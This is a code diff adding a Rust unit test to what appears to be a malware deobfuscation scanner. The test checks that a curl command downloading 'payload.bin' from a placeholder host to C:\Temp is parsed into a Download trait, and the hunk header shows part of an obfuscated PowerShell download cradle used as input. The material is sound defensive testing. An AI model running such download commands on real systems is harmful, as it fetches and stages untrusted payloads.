@@ -14178,6 +14178,27 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn curl_attached_url_schemeless_in_deob_text_emits_structured_download() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        crate::deob_scan::scan_deob_text(
+            r#"curl --url=curl-attached-schemeless-deob.example/payload.bin --output C:\Temp\payload.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "http://curl-attached-schemeless-deob.example/payload.bin"
+                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
+            )
+        });
+        assert!(
+            has,
+            "curl attached schemeless --url source not recovered: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn curl_short_o_glued_in_deob_text_emits_clean_destination() {
         let mut env = crate::env::Environment::new(&Config::default());
         crate::deob_scan::scan_deob_text(
